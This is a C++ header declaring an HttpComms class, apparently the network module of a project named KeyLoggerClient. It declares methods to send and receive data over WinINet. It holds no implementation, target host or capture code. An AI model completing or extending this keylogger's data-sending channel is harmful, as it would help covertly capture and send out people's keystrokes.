// KeyLoggerClient/include/communication/HttpComms.h
#ifndef HTTPCOMMS_H
#define HTTPCOMMS_H

#include "communication/BaseComms.h"
#include "core/Platform.h"
#include <vector>
#include <cstdint>

class Configuration;

class HttpComms : public BaseComms {
public:
    explicit HttpComms(Configuration* config);
    ~HttpComms();
    
    bool Initialize() override;
    bool SendData(const std::vector<uint8_t>& data) override;
    void Cleanup() override;
    bool TestConnection() const override;
    std::vector<uint8_t> ReceiveData() override;
    
private:
    Configuration* m_config;
    
    #if PLATFORM_WINDOWS
    HINTERNET m_hSession;
    HINTERNET m_hConnect;
    #else
    void* m_hSession;   // Placeholder for Linux
    void* m_hConnect;   // Placeholder for Linux
    #endif
};

#endif